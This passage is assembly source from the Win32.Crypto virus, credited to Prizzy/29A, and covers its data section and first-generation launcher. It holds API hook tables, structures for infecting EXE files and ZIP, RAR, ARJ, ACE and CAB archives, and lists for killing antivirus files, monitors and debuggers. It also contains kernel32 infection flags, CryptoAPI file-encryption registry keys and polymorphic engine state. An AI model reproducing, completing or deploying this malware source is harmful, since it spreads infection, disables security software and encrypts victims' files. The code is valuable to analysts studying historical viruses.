szFreeLibrary:		__macro_CRC32 <FreeLibrary>
			db	0, 0, 0, 0, 13, "ADVAPI32.DLL", 0
	advapi32_name	equ $ - 13
szCryptAcquireContextA: __macro_CRC32 <CryptAcquireContextA>
szCryptExportKey:	__macro_CRC32 <CryptExportKey>
szCryptImportKey:	__macro_CRC32 <CryptImportKey>
szCryptGetUserKey:	__macro_CRC32 <CryptGetUserKey>
szCryptGetProvParam:	__macro_CRC32 <CryptGetProvParam>
szCryptGenKey:		__macro_CRC32 <CryptGenKey>
szCryptEncrypt: 	__macro_CRC32 <CryptEncrypt>
szCryptDecrypt: 	__macro_CRC32 <CryptDecrypt>
szCryptDestroyKey:	__macro_CRC32 <CryptDestroyKey>
szCryptReleaseContext:	__macro_CRC32 <CryptReleaseContext>
szRegOpenKeyExA:	__macro_CRC32 <RegOpenKeyExA>
szRegQueryValueExA:	__macro_CRC32 <RegQueryValueExA>
szRegQueryInfoKeyA:	__macro_CRC32 <RegQueryInfoKeyA>
szRegEnumValueA:	__macro_CRC32 <RegEnumValueA>
szRegSetValueExA:	__macro_CRC32 <RegSetValueExA>
szRegCreateKeyExA:	__macro_CRC32 <RegCreateKeyExA>
szRegCloseKey:		__macro_CRC32 <RegCloseKey>
			db	0, 0, 0, 0, 11, "USER32.DLL", 0
	user32_name	equ $ - 11
szSetTimer:		__macro_CRC32 <SetTimer>
szKillTimer:		__macro_CRC32 <KillTimer>
szFindWindowA:		__macro_CRC32 <FindWindowA>
szPostMessageA: 	__macro_CRC32 <PostMessageA>
szCharUpperBuffA:	__macro_CRC32 <CharUpperBuffA>
			db	0, 0, 0, 0, 0	;end of table

	Hooked_API_functions:	;1st value = orig. adr ... 2nd = new function
hfCreateFileW		dd  offset myCreateFileA - 5, offset myCreateFileW
hfCreateFileA		dd  offset myOpenFile	 - 5, offset myCreateFileA
hfOpenFile		dd  offset my_lopen	 - 5, offset myOpenFile
hf_lopen		dd  offset myCopyFileW	 - 5, offset my_lopen

hfCopyFileW		dd  offset myCopyFileA	 - 5, offset myCopyFileW
hfCopyFileA		dd  offset myMoveFileW	 - 5, offset myCopyFileA
hfMoveFileW		dd  offset myMoveFileA	 - 5, offset myMoveFileW
hfMoveFileA		dd  offset myMoveFileExW - 5, offset myMoveFileA
hfMoveFileExW		dd  offset myMoveFileExA - 5, offset myMoveFileExW
hfMoveFileExA		dd  offset myLoadLibraryW- 5, offset myMoveFileExA

hfLoadLibraryW		dd  offset myLoadLibraryA    - 5, offset myLoadLibraryW
hfLoadLibraryA		dd  offset myLoadLibraryExW  - 5, offset myLoadLibraryA
hfLoadLibraryExW	dd  offset myLoadLibraryExA  - 5, offset myLoadLibraryExW
hfLoadLibraryExA	dd  offset myFreeLibrary     - 5, offset myLoadLibraryExA
hfFreeLibrary		dd  offset EndOfNewFunctions - 5, offset myFreeLibrary

		; common valuez

gdt_flags		dd	00000000h	;fixed & remote disks
file_infected		dd	00000000h	;number of infected files

		; copyright

szAuthor		db	"Win32.Crypto, (c)oded by Prizzy/29A",13,10
			db	"Greetz to Darkman, Benny and GriYo"

;ÄÄÄ´ archivez struct ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

		; ACE,RAR SFX information

Archive_MagicWhere:

  ACE_MagicWhere	dw	0,ACENeededBytes;ACE archive (*.ACE)
			dw	05C00h,300h	;ACE-SFX (DOS)
			dw	0DE00h,2200h	;ACE-SFX English/German
						;(Win 95/98, NT 4.x)

  RAR_MagicWhere	dw	0,20		;RAR archive (*.RAR)
			dw	2400h,800h	;RAR-SFX (DOS)
			dw	5000h,800h	;RAR-SFX (Win 95/98, NT 4.x)

  ACE_Magic		db	'**ACE**'
  ACE_Magic_Length	equ	07
  RAR_Magic		db	'Rar!',1Ah,7,0
  RAR_Magic_Length	equ	07

		; ACE archivez struct

ACE_h_struct	    equ this byte
  ACEhHeadCrc		dw	0000h
  ACEhHeadSize		dw	0000h
  ACEhHeadType		db	00h
  ACEhHeadFlags 	dw	0000h
  ACEhSignature 	db	'**ACE**'
ACE_h_struct_finish equ this byte

ACE_h_struct_continue	struc			;this structure ain't
  ACEhVerMod		db	00h		;neccessary for RAR's
  ACEhVerCr		db	00h		;opeartions
  ACEhHostCr		db	00h
  ACEhVolumeNumber	db	00h
  ACEhTimeDate		dd	00000000h
  ACEhReserved1 	dw	0000h
  ACEhReserved2 	dw	0000h
  ACEhReserved3 	dd	00000000h
  ACEhAvSize		db	00h
  ACEhAv		equ	ThisPlace
  ACEhCommentSize	dw	0000h
  ACEhComment		equ	ThisPlace
			ends

ACE_f_struct		struc			;this structure ain't
  ACEfHeadCRC		dw	0000h		;neccessary for RAR's
  ACEfHeadSize		dw	0000h		;opeartions
  ACEfHeadType		db	00h
  ACEfHeadFlags 	dw	0000h
  ACEfCompressedSize	dd	00000000h
  ACEfUnCompressedSize	dd	00000000h
  ACEfTimeDate		dd	00000000h
  ACEfAttrib		dd	00000000h
  ACEfCRC32		dd	00000000h
  ACEfTechType		db	00h
  ACEfTechQual		db	00000000h
  ACEfTechParm		dw	0000h
  ACEfReserved		dw	0000h
  ACEfFilenameSize	dw	0000h
  ACEfFilename		db	8+1+3 dup (00h)
			ends

ACENeededBytes		equ ACE_h_struct_finish - ACE_h_struct

		; RAR archivez struct

  RARSignature		db 'Rar!',1Ah,7,0	;RAR's signature (v1.5+)
  RARSignature_Length	equ 07			;seven bytes

RAR_struct	    equ this byte
  RARHeaderCRC		dw 0000h
  RARHeaderType 	db 00h
  RARFileFlags		dw 0000h
  RARHeaderSize 	dw 0000h
RAR_struct_finish   equ this byte

RAR_struct_continue	struc			;this structure ain't
  RARCompressedSize	dd 00000000h		;neccessary for RAR's
  RARUncompressedSize	dd 00000000h		;opeartions
  RARHostOS		db 00h
  RARFileCRC		dd 00000000h
  RARDateTime		dd 00000000h
  RARVersionNeed	db 00h
  RARMethod		db 00h
  RARFileNameSize	dw 0000h
  RARFileAttribute	dd 00000000h
  RARFileName		db 8+1+3 dup(00h)
			ends

RARNeededBytes	    equ RAR_struct_finish - RAR_struct

		; ARJ archivez struct

ARJ_struct	    equ this byte
  ARJHeaderId		dw	0EA60h
  ARJHeaderSize 	dw	0000h
  ARJ1HeaderSize	db	00h
  ARJVersionDone	db	00h
  ARJVersionNeed	db	00h
  ARJHostOS		db	00h
  ARJFlags		db	00h
  ARJMethod		db	00h
  ARJType		db	00h
  ARJReserved		db	00h
  ARJDateTime		dd	00000000h
  ARJCompressedSize	dd	00000000h
ARJ_struct_finish   equ this byte

ARJ_struct_continue	struc			;this structure ain't
  ARJUncompressedSize	dd	00000000h	;neccessary for ARJ's
  ARJFileCRC		dd	00000000h	;opeartions
  ARJEntryname		dw	0000h
  ARJAccessMode 	dw	0000h
  ARJHostData		dw	0000h
  ARJFilename		db	8+1+3 dup(00h)	;from this it isn't exact,
  ARJComment		db	00h		;ARJFilename has not 8+1+3
  ARJHeaderCRC		dd	00000000h	;size
  ARJExtHeader		dw	0000h
  ARJEnd		dw	0EA60h, 0000h
			ends

ARJNeededBytes	    equ ARJ_struct_finish - ARJ_struct
ARJGetSizeOnly	    equ ARJVersionDone - ARJ_struct

		; ZIP archivez struct

ZIPInfoBuffer	    equ this byte		;thanks to ZIP's structs
  ZIPRHeaderId		db	'PK'		;from Vecna's "El Inca"
  ZIPRSignature 	db	01h, 02h	;virus
  ZIPRVerMade		dw	000Ah
  ZIPRVerNeed		dw	000Ah
  ZIPRFlags		dw	0000h
  ZIPRMethod		dw	0000h
  ZIPRTimeDate		dd	00000000h
  ZIPRCRC32		dd	00000000h
  ZIPRCompressed	dd	00000000h
  ZIPRUncompressed	dd	00000000h
  ZIPRSizeFilename	dw	0000h
  ZIPRExtraField	dw	0000h
  ZIPRCommentSize	dw	0000h
  ZIPRDiskNumba 	dw	0000h
  ZIPRInternalAttr	dw	0000h
  ZIPRExternalAttr	dd	00000000h
  ZIPROffsetLHeaderR	dd	00000000h
  ZIPRFilename		db	8+1+3 dup (00h)
ZIPRHeaderSize	    equ ZIPRFilename - ZIPRHeaderId
ZIPRScanSize1	    equ ZIPRSizeFilename - ZIPRHeaderId
ZIPRScanSize2	    equ ZIPRFilename - ZIPRSizeFilename
ZIPRScanSize3	    equ ZIPROffsetLHeaderR - ZIPRSizeFilename

ZIPMHeaderBuffer	struc			;this structure ain't
  ZIPLHeaderId		db	'PK'		;neccessary for ZIP's
  ZIPLSignature 	dw	0403h		;operations
  ZIPLVersionNeed	dw	0000h
  ZIPLFlags		dw	0000h
  ZIPLMethod		dw	0000h
  ZIPLDateTime		dd	00000000h
  ZIPLCRC32		dd	00000000h
  ZIPLCompressed	dd	00000000h
  ZIPLUncompressed	dd	00000000h
  ZIPLSizeFilename	dw	0000h
  ZIPLExtraField	dw	0000h
  ZIPLFilename		db	8+1+3 dup (00h)
			ends
ZIPMScanSize	    equ ZIPLSizeFilename - ZIPMHeaderBuffer
ZIPMFilename	    equ ZIPLFilename - ZIPMHeaderBuffer

ZIPReadBuffer	    equ this byte
  ZIPEHeaderId		db	'PK'
  ZIPSignature		dw	0000h
  ZIPNoDisk		dw	0000h
  ZIPNoStartDisk	dw	0000h
  ZIPEntryDisk		dw	0000h
  ZIPEntrysDir		dw	0000h
  ZIPSizeDir		dd	00000000h
  ZIPOffsetDir		dd	00000000h
  ZIPCommentLenght	dw	0000h
ZIPEHeaderSize	    equ this byte - offset ZIPReadBuffer

		; CAB achivez struct

CAB_h_struct	    equ this byte
  CABh_Magic		db	'MSCF'		;"MSCF" signature
  CABh_Reserved1	dd	00000000h	;reserved
  CABh_FileSize 	dd	00000000h	;file size of this cabinet
  CABh_Reserved2	dd	00000000h	;reserved
  CABh_FirstRec 	dd	00000000h	;offset of the 1st entry
  CABh_Reserved3	dd	00000000h	;reserved
  CABh_VersionMin	db	00h		;CAB file format version
  CABh_VersionMaj	db	00h		;curently: 0x0103
  CABh_nFolders 	dw	0000h		;number of folders
  CABh_nFiles		dw	0000h		;number of files
  CABh_Flags		dw	0000h		;1=exist its prev. cabinet
						;2=exist its next  cabinet
						;4=exist its reser. field
  CABh_ID		dw	0000h		;identification number
  CABh_Number		dw	0000h		;number of cab (0=the first)
CAB_h_finish	    equ this byte

CAB_reserved		struct
  CABr_length		dw	0000h		;if CABh_Flags=4
  CABr_reserved 	equ	this byte
			ends

CAB_directory_start equ this byte
  CABd_FirstRec 	dd	00000000h	;offset of the 1st dir
  CABd_nData		dw	0000h		;number of cfDATA structz
  CABd_Compress 	dw	0000h		;compression type
  CABd_Reserved 	equ	this byte	;this can be reserved area

CAB_file_start	    equ this byte
  CABf_UnCompSize	dd	00000000h	;file size (uncompressed)
  CABf_FileStart	dd	00000000h	;offset of the file
  CABf_Flags		dw	0000h		;0000=file in folder #0
						;0001=file in folder #1
						;FFFD=file from prev
						;FFFE=file to next
						;FFFF=file prev_and_next
  CABf_Date		dw	1234h		;date
  CABf_Time		dw	1234h		;time
  CABf_Attribs		dw	0020h		;attr of the file
  CABf_FileName 	db	8+1+3 dup (00h) ;file_name + 00h
			db	00h

CAB_entry	    equ this byte
  CABe_CRC		dd	00000000h	;checksum of this entry
  CABe_Compr		dw	0000h		;compressed size
  CABe_UnCompr		dw	0000h		;uncompressed size
  CABe_Compr_data	equ	this byte

		; generate command for archiver programs by this table
		; include compress method, archives filenames, and ">nul"
		; note: 32=20h because of i'm using DN (and it does optim.)

ArchiverCommand db	' a -ep -std -m'	,05h,'12345'   ;ACE
		db	' a -ep',32,32,32,32,32,32, \
				    '-m'	,05h,'12345'   ;RAR
		db	' a -e',32,32,32,32,32,32,32, \
				    '-m'	,04h,'1234 '   ;ARJ
		db	' -a'  ,32,32,32,32,32,32,32,32,32, \
				    '-e'	,04h,'xnfs '   ;PKZIP

ArchiverCommandSize	equ 0000000Eh		;lenght of one command
ArchiverCommandRealSize equ 00000014h		;lenght of command + c. method

		; I must find these programs by hyper infection
		; the 1st value means - 00h = only extension, 01h = name
		; the 4th value means - 00h = search, 01h = don't search
		; the 5th value means - jump there, if found
		; the 6th value means - useful value for that function

HyperTable	db	01h,'PKZIP.EXE'   , 00h, 00h
		dd	offset archive_act, offset NewZIP
		db	01h,'ARJ.EXE'	  , 00h, 00h
		dd	offset archive_act, offset NewARJ
		db	01h,'RAR.EXE'	  , 00h, 00h
		dd	offset archive_act, offset NewRAR
		db	01h,'ACE.EXE'	  , 00h, 00h
		dd	offset archive_act, offset NewACE
		db	00h,'.EXE'	  , 00h, 00h
		dd	offset infect_file, 00000000h
		db	00h,'.ZIP'	  , 00h, 00h  ;Internet's archive
		dd	offset infect_file, 00000000h
		db	00h,'.ARJ'	  , 00h, 00h  ;Old archive
		dd	offset infect_file, 00000000h
		db	00h,'.RAR'	  , 00h, 00h  ;User's archive
		dd	offset infect_file, 00000000h
		db	00h,'.ACE'	  , 00h, 00h  ;Hacker's archive
		dd	offset infect_file, 00000000h
		db	00h,'.CAB'	  , 00h, 00h  ;Fucking MicroSoft's
		dd	offset infect_file, 00000000h ;archive format
		db	01h,'AVP.CRC'	  , 00h, 00h
		dd	offset kill_av	  , 00000000h
		db	01h,'IVP.NTZ'	  , 00h, 00h
		dd	offset kill_av	  , 00000000h
		db	01h,'ANTI-VIR.DAT', 00h, 00h
		dd	offset kill_av	  , 00000000h
		db	01h,'CHKLIST.MS'  , 00h, 00h
		dd	offset kill_av	  , 00000000h
		db	01h,'CHKLIST.CPS' , 00h, 00h
		dd	offset kill_av	  , 00000000h
		db	01h,'SMARTCHK.MS' , 00h, 00h
		dd	offset kill_av	  , 00000000h
		db	01h,'SMARTCHK.CPS', 00h, 00h
		dd	offset kill_av	  , 00000000h
		db	01h,'AGUARD.DAT'  , 00h, 00h
		dd	offset kill_av	  , 00000000h
		db	01h,'AVGQT.DAT'   , 00h, 00h
		dd	offset kill_av	  , 00000000h
		db	01h,'LGUARD.VPS'  , 00h, 00h  ;AVAST's viruses data-
		dd	offset kill_avast , 00000000h ;base, hack its !!!
		db	0FFh

HyperTable_OneSize  equ 0000000Fh		      ;size of ext field
HyperTable_HalfSize equ 00000009h		      ;size of pointers

gen_archive_number	equ	10
gen_archive_filename	db	0,7,'install', 1,5,'setup', 0,3,'run', \
				0,5,'sound',   0,6,'config',0,4,'help', \
				1,6,'gratis',  1,5,'crack', 1,6,'update', \
				1,6,'readme'

		; Hyper Infection - kernel32 internal values

HyperInfection_k32	dd	00000000h	;actived from "kernel32" ?
HyperInfection_timerID	dd	00000000h	;timer identification

		; AVAST's viruses database

AVAST_newSize	equ	514847			;this size + <0,50Kb)
AVAST_memSize	equ	AVAST_newSize + 100h

		; some AV monitors

kill_AV 	equ	this byte
		db	'AVG Control Center',0			;AVG Grisoft
		db	'Avast32 -- Rezidentní podpora',0	;AVAST32 (CZ)
		db	'AVP Monitor',0 			;AVP
		db	'Amon Antivirus Monitor',0		;AMON English
		db	'Antivírusovı monitor Amon',0		;AMON Slovak
kill_AV_num	equ	5			;four monitors

		; some debuggers

kill_SoftICE	db	'\\.\SICE',0		;SoftICE 95/98
kill_SoftICE_NT db	'\\.\NTICE',0		;SoftICE NT/2k

		; kernel infection

kernel_name	db	'\KERNEL32.DLL',0
kernel_name_len equ	$ - kernel_name
it_is_kernel	dd	00000000h	;infect kernel via "infect_file" ?

		; do not infected table (thanx Lord Julus/29A for this tbl)

avoid_table	db 'TB'     ,00h,'F-'	  ,00h,'AW'	,00h,'AV'    ,00h
		db 'NAV'    ,00h,'PAV'	  ,00h,'RAV'	,00h,'NVC'   ,00h
		db 'FPR'    ,00h,'DSS'	  ,00h,'IBM'	,00h,'INOC'  ,00h
		db 'ANTI'   ,00h,'SCN'	  ,00h,'VSAF'	,00h,'VSWP'  ,00h
		db 'PANDA'  ,00h,'DRWEB'  ,00h,'FSAV'	,00h,'SPIDER',00h
		db 'ADINF'  ,00h,'SONIQUE',00h,'SQSTART',00h,01h

		; Microsoft Cryptography functions, what a dream {:-D

crypto_KeyName	db	'Prizzy/29A',0		;my new crypto-key
crypto_Action	dd	00000000h		;exists crypto functions ?
crypto_loadKey	dd	00000000h		;has key been loaded ?

crypto_Provider dd	00000000h		;CSP provider
crypto_Key	dd	00000000h		;CPS key
crypto_XchgKey	dd	00000000h		;exportable CSP key

crypto_BlobLen	dd	00000000h		;simple blob key length
crypto_BlobKey	dd	00000000h		;simple blob key pointer
crypto_BlobHan	dd	00000000h		;simple blob key reg handle

crypto_mainProcId dd	00000000h
crypto_mainThread dd	00000000h		;main (crypto) thread handle
crypto_thread	dd	00000000h		;thread parameter
CT_LOADKEY	equ	1			;get key handle
CT_CRYPTFILE	equ	2			;crypt_file function
CT_DECRYPTFILE	equ	4			;decrypt_file function
crypto_thread_err dd	00000000h		;set LastError flag

crypto_unFiles	db 'SFC'     ,00h,'MPR'     ,00h,'OLE32'   ,00h
		db 'NTDLL'   ,00h,'GDI32'   ,00h,'RPCRT4'  ,00h
		db 'USER32'  ,00h,'RSASIG'  ,00h,'SHELL32' ,00h
		db 'CRYPT32' ,00h,'RSABASE' ,00h,'PSTOREC' ,00h
		db 'KERNEL32',00h,'ADVAPI32',00h,'RUNDLL32',00h
		db 'SFCFILES',00h,01h

crypto_unReg32	db	"System\CurrentControlSet\Control\SessionManager\KnownDLLs",0
crypto_unReg16	db	"System\CurrentControlSet\Control\SessionManager\Known16DLLs",0

crypto_unReg	equ	this byte
		dd	offset crypto_unReg32
		dd	offset crypto_unReg16
crypto_unReg_E	equ	this byte

crypto_mainMutex db	"Crypto:mainThread",0
crypto_mutex	db	"Crypto:Mutex",0
crypto_library	dd	00000000h		;libraries information
crypto_nLib	dd	00000000h		;number of items

crypto_Register db	"SOFTWARE\Microsoft\Cryptography\UserKeys\Prizzy/29A",0
crypto_RegWhere db	"EPbK",0
crypto_RegFlag	db	"Kiss Of Death",0

		align	dword			;filesize divided by eight
		dd	00000000h		;only for multi-layer poly

;ÄÄÄ´ memory buffer which ain't in file ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
file_end:

		; working with filez

filename_ptr	dd	00000000h	;pointer to a filename
filename_size	equ	260		;MAX_SIZE defined by M$
filename	db	filename_size dup (00h)
file_handle	dd	00000000h	;open file handle
file_hmap	dd	00000000h	;mapped file handle
file_hmem	dd	00000000h	;mapped file in memory
file_hsize	dd	00000000h	;file size + virus size
last_error	dd	00000000h	;buffer for file operations

		; hyper infection

search_filename db	filename_size dup (00h)
search_start	db	00h		;have we begun yet ?
search_address	dd	00000000h	;address of dta's in memory
search_plunge	db	00h		;how many dirz we have in
search_handle	dd	00000000h	;FindFirstFile handle
search_table	dd	00000000h	;position in HyperTable
dta		dta_struc <00h> 	;main dta struc for search_handle
time		sysTime_struc <00h>	;time for my new hyper_infection

		; file infected co-processor structs

exp_truncate	dw	0000h			;copro status flags
exp_default	dw	0000h			;copro status flags
exp_further	dd	00000000h		;copro number's buffer

decimal_places	dd	00000000h		;dec_place=modf(num,&int)

		; new infection method (compressed, inside archive)

AProgram	struc
program 	dd	00000000h		;where's place program
dropper 	dd	00000000h		;where's place dropper
		ends

NewArchive	equ	this byte
NewArchiveNum	equ	00000005h
NewArchiveSize	equ	size AProgram

NewACE		AProgram <00h>
NewRAR		AProgram <00h>
NewARJ		AProgram <00h>
NewZIP		AProgram <00h>
NewCAB		AProgram <00h>

FileTime	File_Time <00h> 		;get/set archive infect flag
SystemTime	sysTime_struc <00h>		;convert FileTime to SystemT

		; CreateProcess structures

ProcessInformation    Process_Information <00h> ;info about process
StartupInfo	      Startup_Info	  <00h> ;window's info

		; Coprocessor buffer - natural logarithm

copro_nl_buffer db	128 dup (00h)		;all regz + all flagz

		; data used by Prizzy Polymorphic Engine (PPE-II)

poly_seed	dd	00000000h		;last number in get_rnd32 function
garbage_style	db	00h			;have I use unmodify flags instructions ?

used_regs	db	00h			;used eax,ecx,edx...
gl_index_reg	db	00h			;which reg is index ?
gl_index_reg2	db	00h			;more complex - no comment :)

mem_address	dd	00000000h		;where's copy of this virus
poly_start	dd	00000000h		;where poly decoder start
poly_finish	dd	00000000h		;where poly decoder finish
recursive_level db	00h			;garbage recursive layer

index_reg	db	00h			;index_reg in base-reg
mlayer_reg	db	00h			;mlayer_reg in base-reg
code_reg	db	00h			;code_reg in base-reg

code_value	dd	00000000h		;startup code value
code_value_add	dd	00000000h		;next_code = code + this_c
crypt_style	db	00h			;(0=add/1=sub/2=xor) [---],reg32

decoder_back	dd	00000000h		;address for JNZ loop
compare_index	db	00h			;where in <compare_buffer>
compare_buffer	dd	5 dup(00000000h)	;see <g_compare> for more info

mem_end:

;ÄÄÄ´ first generation ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

first_generation:

		; after installing, run it above
		mov	[__pllg_lsize],00000000h
		mov	dword ptr [original_ep], \
			offset __fg_run_this - offset virus_start + 1000h
		jmp	virus_start

	__fg_run_this:
		; display a simple message box
		push	MB_OK
		@pushsz "Win32.Crypto - welcome to my world..."
		@pushsz "First generation sample"
		push	0
		call	MessageBoxA

		; exit program - haha huahaha <program> :))
		push	0
		call	ExitProcess

;ÄÄÄ´ end of virus ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
end first_generation
